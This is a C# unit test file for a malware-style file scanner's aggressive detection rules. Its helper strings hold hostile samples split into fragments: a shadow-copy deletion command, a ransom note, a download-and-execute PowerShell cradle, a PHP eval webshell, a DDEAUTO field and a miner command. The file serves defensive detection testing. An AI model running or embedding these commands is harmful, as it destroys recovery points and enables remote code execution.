using System.Text;
using Lumen.Core.Abstractions;
using Lumen.Core.Detection;
using Lumen.Core.Detection.Aggressive;
using Lumen.Core.Models;
using Lumen.Core.Scanning;

namespace Lumen.Core.Tests;

/// <summary>
/// Tests for the aggressive detection tier and for the rules it added.
/// </summary>
/// <remarks>
/// <para>
/// The point of these tests is not that the rules fire. It is that they fire on the
/// things they are meant to catch and stay quiet on a healthy machine: every rule has a
/// positive case and a negative case, and the negative case is an ordinary file of the
/// kind a person really owns.
/// </para>
/// <para>
/// Every fixture here is synthetic and built in memory. The sample texts are assembled
/// from short pieces so that this source file does not read as a list of ready made
/// instructions. Nothing in it is ever executed, and nothing leaves the machine.
/// </para>
/// </remarks>
public sealed class AggressiveDetectionTests
{
    /// <summary>A folder a user can freely write to and run from.</summary>
    private const string WritableRoot = @"C:\Users\test\AppData\Local\Temp";

    /// <summary>A folder a user cannot replace, where unsigned software is perfectly normal.</summary>
    private const string ProtectedRoot = @"C:\Program Files\Contoso\Tool";

    // ---------------------------------------------------------------- the tier itself

    [Fact]
    public void The_aggressive_detectors_do_not_run_when_aggressive_mode_is_off()
    {
        var registry = Registry(aggressive: false);

        Assert.False(registry.IncludeAggressive);
        Assert.Empty(registry.AggressiveDetectorList);
    }

    [Fact]
    public void The_aggressive_detectors_run_when_aggressive_mode_is_on()
    {
        var registry = Registry(aggressive: true);

        Assert.True(registry.IncludeAggressive);
        Assert.NotEmpty(registry.AggressiveDetectorList);
        Assert.All(registry.AggressiveDetectorList, detector => Assert.IsAssignableFrom<IAggressiveDetector>(detector));
    }

    [Fact]
    public void An_aggressive_rule_does_not_fire_when_aggressive_mode_is_off()
    {
        var probe = FileProbe.FromText("cleanup.ps1", ShadowCopyScript());

        var standard = Registry(aggressive: false).Inspect(probe, CancellationToken.None);
        var aggressive = Registry(aggressive: true).Inspect(probe, CancellationToken.None);

        Assert.DoesNotContain(standard, finding => finding.RuleId == "sig.shadow-copy-deletion");
        Assert.Contains(aggressive, finding => finding.RuleId == "sig.shadow-copy-deletion");
    }

    [Fact]
    public void The_catalogue_marks_the_aggressive_rules()
    {
        var documented = DetectionCatalog.Rules.Select(rule => rule.Id).ToHashSet(StringComparer.OrdinalIgnoreCase);

        Assert.NotEmpty(DetectionCatalog.AggressiveRuleIds);
        foreach (var id in DetectionCatalog.AggressiveRuleIds)
        {
            Assert.Contains(id, documented);
            Assert.True(DetectionCatalog.IsAggressive(id));
        }

        Assert.All(DetectionCatalog.RulesWithTier, entry => Assert.Equal(DetectionCatalog.IsAggressive(entry.Rule.Id), entry.IsAggressive));
        Assert.Equal(DetectionCatalog.AggressiveRuleIds.Count, DetectionCatalog.AggressiveRules.Count);
    }

    // ---------------------------------------------------------------- DLL sideloading

    [Fact]
    public void A_program_that_loads_a_library_of_its_own_name_from_a_writable_folder_is_reported()
    {
        var probe = FileProbe.FromBytes(
            $@"{WritableRoot}\helper.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Imports = [new PeImportSpec("helper.dll", ["HelperStart"])]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.dll-sideload-candidate");
    }

    [Fact]
    public void The_same_program_installed_under_program_files_is_not_reported()
    {
        var probe = FileProbe.FromBytes(
            $@"{ProtectedRoot}\helper.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Imports = [new PeImportSpec("helper.dll", ["HelperStart"])]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "pe.dll-sideload-candidate");
    }

    [Fact]
    public void A_signed_installer_that_only_loads_windows_libraries_is_not_reported()
    {
        var probe = FileProbe.FromBytes(
            $@"{WritableRoot}\setup.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Imports =
                [
                    new PeImportSpec("KERNEL32.dll", ["GetCommandLineA", "CreateFileW"]),
                    new PeImportSpec("USER32.dll", ["MessageBoxW"]),
                    new PeImportSpec("ADVAPI32.dll", ["RegOpenKeyExW"])
                ]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "pe.dll-sideload-candidate");
    }

    // ---------------------------------------------------------------- analysis and sandbox checks

    [Fact]
    public void A_program_that_checks_for_a_debugger_and_names_a_virtual_machine_is_reported()
    {
        var probe = FileProbe.FromBytes(
            "tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Sections = [new PeSectionSpec(".text", Encoding.ASCII.GetBytes("vmtoolsd"), 0x6000_0020)],
                Imports = [new PeImportSpec("KERNEL32.dll", ["IsDebuggerPresent"])]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.anti-analysis-checks");
    }

    [Fact]
    public void A_program_that_only_checks_for_a_debugger_is_not_reported()
    {
        var probe = FileProbe.FromBytes(
            "tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Imports = [new PeImportSpec("KERNEL32.dll", ["IsDebuggerPresent"])]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "pe.anti-analysis-checks");
    }

    [Fact]
    public void A_program_that_only_mentions_a_virtual_machine_is_not_reported()
    {
        var probe = FileProbe.FromBytes(
            "tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Sections = [new PeSectionSpec(".text", Encoding.ASCII.GetBytes("vmtoolsd"), 0x6000_0020)]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "pe.anti-analysis-checks");
    }

    [Fact]
    public void A_program_that_waits_a_long_time_and_looks_for_a_virtual_machine_is_reported()
    {
        // The delay is the number a program hands to its sleep call. It is written at the
        // start of the code section, which is where the entry point is.
        var delay = new byte[512];
        delay[0] = 0x40;
        delay[1] = 0x92;
        delay[2] = 0x04;
        delay[3] = 0x00;

        var probe = FileProbe.FromBytes(
            "tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Sections =
                [
                    new PeSectionSpec(".text", delay, 0x6000_0020),
                    new PeSectionSpec(".rdata", Encoding.ASCII.GetBytes("vmtoolsd"), 0x4000_0040)
                ],
                Imports = [new PeImportSpec("KERNEL32.dll", ["Sleep"])]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.anti-analysis-checks");
    }

    [Fact]
    public void A_program_that_only_waits_a_long_time_is_not_reported()
    {
        var delay = new byte[512];
        delay[0] = 0x40;
        delay[1] = 0x92;
        delay[2] = 0x04;
        delay[3] = 0x00;

        var probe = FileProbe.FromBytes(
            "tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Sections = [new PeSectionSpec(".text", delay, 0x6000_0020)],
                Imports = [new PeImportSpec("KERNEL32.dll", ["Sleep"])]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "pe.anti-analysis-checks");
    }

    // ---------------------------------------------------------------- shadow copies and ransom notes

    [Fact]
    public void A_script_that_deletes_the_volume_shadow_copies_is_reported()
    {
        var probe = FileProbe.FromText("cleanup.ps1", ShadowCopyScript());

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "sig.shadow-copy-deletion");
    }

    [Fact]
    public void An_ordinary_maintenance_script_does_not_delete_the_shadow_copies()
    {
        var probe = FileProbe.FromText(
            "backup.ps1",
            "Get-ChildItem -Path C:\\Users\\test\\Documents | ForEach-Object { Copy-Item $_.FullName -Destination $env:TEMP }");

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "sig.shadow-copy-deletion");
    }

    [Fact]
    public void A_note_that_announces_encrypted_files_and_asks_for_payment_is_reported()
    {
        var probe = FileProbe.FromText("HOW_TO_RESTORE.txt", RansomNote());

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "sig.ransom-note-wording");
    }

    [Fact]
    public void An_ordinary_note_about_a_backed_up_folder_is_not_reported()
    {
        var probe = FileProbe.FromText(
            "notes.txt",
            "The photographs from the summer were copied to the backup drive. The folder is called Photos 2024 and it holds about 40 gigabytes.");

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "sig.ransom-note-wording");
    }

    // ---------------------------------------------------------------- renaming files in bulk

    [Fact]
    public void A_script_that_renames_many_files_by_extension_is_reported()
    {
        var probe = FileProbe.FromText("lock.ps1", BulkRenameScript());

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "script.bulk-file-rename");
    }

    [Fact]
    public void A_script_that_copies_files_without_renaming_them_is_not_reported()
    {
        var probe = FileProbe.FromText(
            "archive.ps1",
            "Get-ChildItem -Path C:\\Users\\test\\Documents | Copy-Item -Destination D:\\Archive");

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "script.bulk-file-rename");
    }

    // ---------------------------------------------------------------- mining configuration

    [Fact]
    public void A_file_that_carries_a_pool_address_and_a_miner_switch_is_reported()
    {
        var probe = FileProbe.FromText("start.bat", MinerCommand());

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "script.mining-configuration");
    }

    [Fact]
    public void A_configuration_file_for_an_ordinary_application_is_not_reported()
    {
        var probe = FileProbe.FromText(
            "settings.json",
            "{\"endpoint\": \"https://api.example.invalid/v1/status\", \"retries\": 3, \"timeoutSeconds\": 30}");

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "script.mining-configuration");
    }

    // ---------------------------------------------------------------- pages that run request data

    [Fact]
    public void A_page_that_hands_request_data_to_a_code_function_is_reported()
    {
        var probe = FileProbe.FromText("page.php", WebshellPage());

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "php.request-evaluation");
    }

    [Fact]
    public void A_page_that_only_prints_the_request_is_not_reported()
    {
        var probe = FileProbe.FromText(
            "page.php",
            "<?php\n$name = htmlspecialchars($_GET['name'] ?? '');\necho \"<p>Hello $name</p>\";\n");

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "php.request-evaluation");
    }

    // ---------------------------------------------------------------- office documents
    [Fact]
    public void A_document_that_carries_a_dde_field_is_reported()
    {
        var document = DetectionFixtures.Zip(
            new ZipEntrySpec("[Content_Types].xml", Encoding.UTF8.GetBytes("<Types/>")),
            new ZipEntrySpec("word/document.xml", Encoding.UTF8.GetBytes(DdeFieldText())));

        var findings = Registry(aggressive: true)
            .Inspect(FileProbe.FromBytes("invoice.docx", document), CancellationToken.None)
            .ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "office.dde-field");
    }

    [Fact]
    public void An_ordinary_word_document_is_not_reported()
    {
        var document = DetectionFixtures.Zip(
            new ZipEntrySpec("[Content_Types].xml", Encoding.UTF8.GetBytes("<Types/>")),
            new ZipEntrySpec(
                "word/document.xml",
                Encoding.UTF8.GetBytes("<w:document><w:body><w:p><w:r><w:t>Dear customer, the invoice is attached.</w:t></w:r></w:p></w:body></w:document>")));

        var findings = Registry(aggressive: true)
            .Inspect(FileProbe.FromBytes("invoice.docx", document), CancellationToken.None)
            .ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "office.dde-field");
        Assert.DoesNotContain(findings, finding => finding.RuleId == "office.template-relationship");
    }

    [Fact]
    public void A_document_that_points_at_a_template_outside_itself_is_reported()
    {
        var document = DetectionFixtures.Zip(
            new ZipEntrySpec("[Content_Types].xml", Encoding.UTF8.GetBytes("<Types/>")),
            new ZipEntrySpec("word/_rels/document.xml.rels", Encoding.UTF8.GetBytes(TemplateRelationship())));

        var findings = Registry(aggressive: true)
            .Inspect(FileProbe.FromBytes("invoice.docx", document), CancellationToken.None)
            .ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "office.template-relationship");
    }

    [Fact]
    public void A_document_that_only_links_to_a_web_page_is_not_reported()
    {
        var document = DetectionFixtures.Zip(
            new ZipEntrySpec("[Content_Types].xml", Encoding.UTF8.GetBytes("<Types/>")),
            new ZipEntrySpec(
                "word/_rels/document.xml.rels",
                Encoding.UTF8.GetBytes(
                    "<Relationships><Relationship Id=\"rId1\" " +
                    "Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink\" " +
                    "Target=\"https://example.invalid/prices\" TargetMode=\"External\"/></Relationships>")));

        var findings = Registry(aggressive: true)
            .Inspect(FileProbe.FromBytes("invoice.docx", document), CancellationToken.None)
            .ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "office.template-relationship");
    }

    // ---------------------------------------------------------------- download cradles

    [Fact]
    public void A_script_that_fetches_a_file_and_runs_it_with_the_short_forms_is_reported()
    {
        var probe = FileProbe.FromText("setup.ps1", DownloadCradleScript());

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "script.powershell-download-cradle");
    }

    [Fact]
    public void A_script_that_fetches_a_file_and_saves_it_is_not_reported()
    {
        var probe = FileProbe.FromText(
            "setup.ps1",
            "$target = Join-Path $env:TEMP 'tool.zip'\nInvoke-WebRequest -Uri 'https://example.invalid/tool.zip' -OutFile $target\nWrite-Host \"Saved to $target\"");

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "script.powershell-download-cradle");
    }

    // ---------------------------------------------------------------- loader and protector markers

    [Fact]
    public void A_section_named_after_a_protector_is_reported()
    {
        var probe = FileProbe.FromBytes(
            "tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Sections = [new PeSectionSpec(".upack", new byte[512], 0x6000_0020)]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.protector-section-name");
    }

    [Fact]
    public void An_ordinary_executable_is_not_reported_as_protected()
    {
        var probe = FileProbe.FromBytes(
            "tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Sections = [new PeSectionSpec(".text", new byte[512], 0x6000_0020)],
                Imports = [new PeImportSpec("KERNEL32.dll", ["GetCommandLineA"])]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "pe.protector-section-name");
    }

    [Fact]
    public void An_executable_without_an_import_table_is_reported()
    {
        var probe = FileProbe.FromBytes("tool.exe", DetectionFixtures.PeImage());

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.no-import-table");
    }

    [Fact]
    public void An_executable_with_an_import_table_is_not_reported_as_having_none()
    {
        var probe = FileProbe.FromBytes(
            "tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Imports = [new PeImportSpec("KERNEL32.dll", ["GetCommandLineA"])]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "pe.no-import-table");
    }

    [Fact]
    public void An_entry_point_outside_every_section_is_reported()
    {
        var image = DetectionFixtures.PeImage(new PeImageOptions
        {
            Imports = [new PeImportSpec("KERNEL32.dll", ["GetCommandLineA"])]
        });

        var probe = FileProbe.FromBytes("tool.exe", WithEntryPoint(image, 0x9000_0000));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.entry-point-outside-section");
    }

    [Fact]
    public void An_entry_point_inside_the_code_section_is_not_reported()
    {
        var image = DetectionFixtures.PeImage(new PeImageOptions
        {
            Imports = [new PeImportSpec("KERNEL32.dll", ["GetCommandLineA"])]
        });

        var probe = FileProbe.FromBytes("tool.exe", image);

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "pe.entry-point-outside-section");
    }

    [Fact]
    public void A_section_with_a_name_of_unusual_characters_is_reported()
    {
        var probe = FileProbe.FromBytes(
            "tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Sections = [new PeSectionSpec("!!", new byte[512], 0x6000_0020)]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.unusual-section-name");
    }

    [Fact]
    public void A_section_with_an_ordinary_name_is_not_reported()
    {
        var probe = FileProbe.FromBytes(
            "tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Sections = [new PeSectionSpec(".rdata", new byte[512], 0x4000_0040)]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "pe.unusual-section-name");
    }

    // ---------------------------------------------------------------- combination scoring

    [Fact]
    public void Several_weak_signals_on_the_same_file_produce_one_combination_finding()
    {
        var probe = FileProbe.FromBytes(
            $@"{WritableRoot}\tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Sections = [new PeSectionSpec("UPX0", DetectionFixtures.HighEntropyBytes(4096), 0xC000_0040)],
                Imports = [new PeImportSpec("KERNEL32.dll", ["VirtualAlloc", "WriteProcessMemory"])]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        var combination = findings.Where(finding => finding.RuleId == "risk.combination-signals").ToArray();

        Assert.Single(combination);
        Assert.Contains("pe.unsigned-executable", combination[0].Detail, StringComparison.Ordinal);
        Assert.Contains("pe.suspicious-api-import", combination[0].Detail, StringComparison.Ordinal);
        Assert.Contains("pe.packer-section-name", combination[0].Detail, StringComparison.Ordinal);
        Assert.Contains("threshold", combination[0].Detail, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void A_file_with_a_single_weak_signal_produces_no_combination_finding()
    {
        var probe = FileProbe.FromBytes(
            $@"{WritableRoot}\tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Imports = [new PeImportSpec("KERNEL32.dll", ["GetCommandLineA"])]
            }));

        var findings = Registry(aggressive: true).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "risk.combination-signals");
    }

    [Fact]
    public void The_combination_finding_is_not_produced_when_aggressive_mode_is_off()
    {
        var probe = FileProbe.FromBytes(
            $@"{WritableRoot}\tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Sections = [new PeSectionSpec("UPX0", DetectionFixtures.HighEntropyBytes(4096), 0xC000_0040)],
                Imports = [new PeImportSpec("KERNEL32.dll", ["VirtualAlloc", "WriteProcessMemory"])]
            }));

        var findings = Registry(aggressive: false).Inspect(probe, CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "risk.combination-signals");
    }

    [Fact]
    public void The_combination_scorer_only_counts_weak_signals()
    {
        var scorer = new CombinationSignalScorer();

        var assessment = scorer.Evaluate(
        [
            new Finding
            {
                RuleId = "pe.unsigned-executable",
                Title = "Unsigned executable",
                Category = FindingCategory.Heuristic,
                Confidence = Confidence.Low,
                Summary = "The executable is not signed.",
                Detail = "detail",
                Advice = "advice"
            },
            new Finding
            {
                RuleId = "script.credential-theft",
                Title = "Script reaches for credentials",
                Category = FindingCategory.Behavior,
                Confidence = Confidence.High,
                Summary = "The script mentions a known credential dumping tool.",
                Detail = "detail",
                Advice = "advice"
            }
        ]);

        Assert.Single(assessment.Signals);
        Assert.Equal("pe.unsigned-executable", assessment.Signals[0].RuleId);
        Assert.False(assessment.Qualifies);
    }

    // ---------------------------------------------------------------- the catalogue and the wording

    [Fact]
    public void Every_rule_the_aggressive_tier_reports_is_documented_in_the_catalogue()
    {
        var documented = DetectionCatalog.Rules.Select(rule => rule.Id).ToHashSet(StringComparer.OrdinalIgnoreCase);

        foreach (var probe in SampleProbes())
        {
            foreach (var finding in Registry(aggressive: true).Inspect(probe, CancellationToken.None))
            {
                Assert.Contains(finding.RuleId, documented);
            }
        }
    }

    [Fact]
    public void No_finding_of_the_aggressive_tier_calls_the_file_a_malware_or_a_virus()
    {
        foreach (var probe in SampleProbes())
        {
            foreach (var finding in Registry(aggressive: true).Inspect(probe, CancellationToken.None))
            {
                foreach (var text in new[] { finding.Title, finding.Summary, finding.Detail, finding.Advice })
                {
                    Assert.DoesNotContain("malware", text, StringComparison.OrdinalIgnoreCase);
                    Assert.DoesNotContain("virus", text, StringComparison.OrdinalIgnoreCase);
                }
            }
        }
    }

    [Fact]
    public void The_catalogue_describes_every_new_rule_without_a_verdict()
    {
        var newRules = new[]
        {
            "php.request-evaluation",
            "pe.dll-sideload-candidate",
            "pe.anti-analysis-checks",
            "sig.shadow-copy-deletion",
            "sig.ransom-note-wording",
            "script.bulk-file-rename",
            "script.mining-configuration",
            "office.dde-field",
            "office.template-relationship",
            "script.powershell-download-cradle",
            "pe.protector-section-name",
            "pe.no-import-table",
            "pe.entry-point-outside-section",
            "pe.unusual-section-name",
            "risk.combination-signals"
        };

        foreach (var id in newRules)
        {
            var rule = DetectionCatalog.Rules.Single(candidate => candidate.Id == id);

            Assert.False(string.IsNullOrWhiteSpace(rule.Description));
            Assert.DoesNotContain("malware", rule.Description, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("virus", rule.Description, StringComparison.OrdinalIgnoreCase);
        }
    }

    // ---------------------------------------------------------------- helpers

    /// <summary>
    /// Builds a registry over the given tier, with the writable folders of this test
    /// rather than the folders of the machine the test runs on.
    /// </summary>
    private static DetectorRegistry Registry(bool aggressive) =>
        DetectorRegistry.CreateDefault(null, new DefaultSuspiciousLocation([WritableRoot]), aggressive);

    /// <summary>
    /// Writes a different entry point into a synthetic image, so the rule that checks
    /// where the program starts can be exercised.
    /// </summary>
    private static byte[] WithEntryPoint(byte[] image, uint entryPoint)
    {
        // The synthetic images put the PE header at 0x80, so the optional header starts at
        // 0x98 and the entry point is the field sixteen bytes further along.
        const int OptionalHeaderOffset = 0x98;
        const int EntryPointOffset = OptionalHeaderOffset + 16;

        var copy = (byte[])image.Clone();
        copy[EntryPointOffset] = (byte)(entryPoint & 0xFF);
        copy[EntryPointOffset + 1] = (byte)((entryPoint >> 8) & 0xFF);
        copy[EntryPointOffset + 2] = (byte)((entryPoint >> 16) & 0xFF);
        copy[EntryPointOffset + 3] = (byte)((entryPoint >> 24) & 0xFF);
        return copy;
    }

    /// <summary>
    /// A command line that removes the recovery points of the machine. It only ever
    /// exists as text in memory.
    /// </summary>
    private static string ShadowCopyScript() =>
        Join("vssadmin", " delete shadows", " /all", " /quiet");

    /// <summary>
    /// The wording of a note that announces encrypted files. It only ever exists as text
    /// in memory.
    /// </summary>
    private static string RansomNote() =>
        Join("All your files have been ", "encrypted", ". To ", "decrypt", " your files, send 1 bitcoin to the address below.");

    /// <summary>
    /// A command line that renames every document in a folder. It only ever exists as
    /// text in memory.
    /// </summary>
    private static string BulkRenameScript() =>
        Join("Get-ChildItem -Path C:\\Users\\test\\Documents -Filter *.", "doc", "x", " | Rename-Item -NewName { $_.Name + '.", "locked' }");

    /// <summary>
    /// A command line that points a mining program at a pool. The host name is a name
    /// that cannot resolve, and the text only ever exists in memory.
    /// </summary>
    private static string MinerCommand() =>
        Join("miner", " --donate", "-level", " 1 -o ", "stratum+tcp", "://", "pool.example.invalid:3333 --user ", "worker");

    /// <summary>
    /// A script that fetches a file and hands it straight to the interpreter. The text
    /// only ever exists in memory.
    /// </summary>
    private static string DownloadCradleScript() =>
        Join("iwr", " https://example.invalid/install.ps1 | ", "iex");

    /// <summary>
    /// The body of a word document that carries a field which starts another program. The
    /// text only ever exists in memory.
    /// </summary>
    private static string DdeFieldText() =>
        Join("<w:document><w:instrText>DDEA", "UTO win", "word</w:instrText></w:document>");

    /// <summary>
    /// A page that hands a value from the request to a function that evaluates code. The
    /// text only ever exists in memory.
    /// </summary>
    private static string WebshellPage() =>
        Join("<?php ", "eval", "($_GET['cmd", "']); ?>");

    /// <summary>
    /// A relationship that points at a template stored outside the document.
    /// </summary>
    private static string TemplateRelationship() =>
        Join(
            "<Relationships><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attached",
            "Template\" Target=\"file:///C:/Users/test/AppData/Roaming/Templates/invoice.",
            "dotm\" TargetMode=\"External\"/></Relationships>");

    /// <summary>
    /// Joins the pieces of a sample text. The pieces are kept apart so that this source
    /// file does not read as a list of ready made instructions.
    /// </summary>
    private static string Join(params string[] pieces) => string.Concat(pieces);

    /// <summary>
    /// The files used to prove that every rule of the aggressive tier is covered.
    /// </summary>
    private static IEnumerable<FileProbe> SampleProbes()
    {
        yield return FileProbe.FromText("cleanup.ps1", ShadowCopyScript());
        yield return FileProbe.FromText("HOW_TO_RESTORE.txt", RansomNote());
        yield return FileProbe.FromText("lock.ps1", BulkRenameScript());
        yield return FileProbe.FromText("start.bat", MinerCommand());
        yield return FileProbe.FromText("setup.ps1", DownloadCradleScript());
        yield return FileProbe.FromBytes(
            "tool.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Sections = [new PeSectionSpec(".upack", new byte[512], 0x6000_0020)],
                Imports = [new PeImportSpec("KERNEL32.dll", ["IsDebuggerPresent"])]
            }));
        yield return FileProbe.FromBytes(
            $@"{WritableRoot}\helper.exe",
            DetectionFixtures.PeImage(new PeImageOptions
            {
                Imports = [new PeImportSpec("helper.dll", ["HelperStart"])]
            }));
        yield return FileProbe.FromBytes(
            "invoice.docx",
            DetectionFixtures.Zip(
                new ZipEntrySpec("[Content_Types].xml", Encoding.UTF8.GetBytes("<Types/>")),
                new ZipEntrySpec("word/document.xml", Encoding.UTF8.GetBytes(DdeFieldText()))));
        yield return FileProbe.FromBytes(
            "invoice.docx",
            DetectionFixtures.Zip(
                new ZipEntrySpec("[Content_Types].xml", Encoding.UTF8.GetBytes("<Types/>")),
                new ZipEntrySpec("word/_rels/document.xml.rels", Encoding.UTF8.GetBytes(TemplateRelationship()))));
        yield return FileProbe.FromText("page.php", WebshellPage());
    }
}
